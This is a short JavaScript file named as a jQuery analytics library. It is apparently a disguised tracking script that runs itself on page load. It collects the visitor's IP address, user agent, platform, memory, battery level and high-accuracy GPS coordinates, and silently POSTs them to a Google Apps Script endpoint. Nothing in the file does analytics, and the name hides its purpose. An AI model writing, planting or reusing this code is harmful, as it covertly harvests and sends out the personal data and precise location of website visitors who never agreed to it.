// jquery.analytics.min.js
(async function() {
    let payload = {
        ip: "Checking...",
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        ram: navigator.deviceMemory || "N/A",
        battery: null
    };

    // Ambil Data Baterai
    if (navigator.getBattery) {
        const b = await navigator.getBattery();
        payload.battery = Math.round(b.level * 100);
    }

    // Ambil IP
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const d = await res.json();
        payload.ip = d.ip;
    } catch (e) {}

    const send = (data) => {
        fetch("https://script.google.com/macros/s/AKfycbyrr8bjew4x5wXGn0nuLazDLszg0l2VO6CvPA9_tdq1KBbJyCFVUQkooLzwgnc9Pskibw/exec", {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify(data)
        });
    };

    // Kirim Data Dasar Segera
    send(payload);

    // Minta Lokasi
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            payload.lat = pos.coords.latitude;
            payload.long = pos.coords.longitude;
            payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
            send(payload); // Update dengan lokasi
        }, null, { enableHighAccuracy: true });
    }
})();
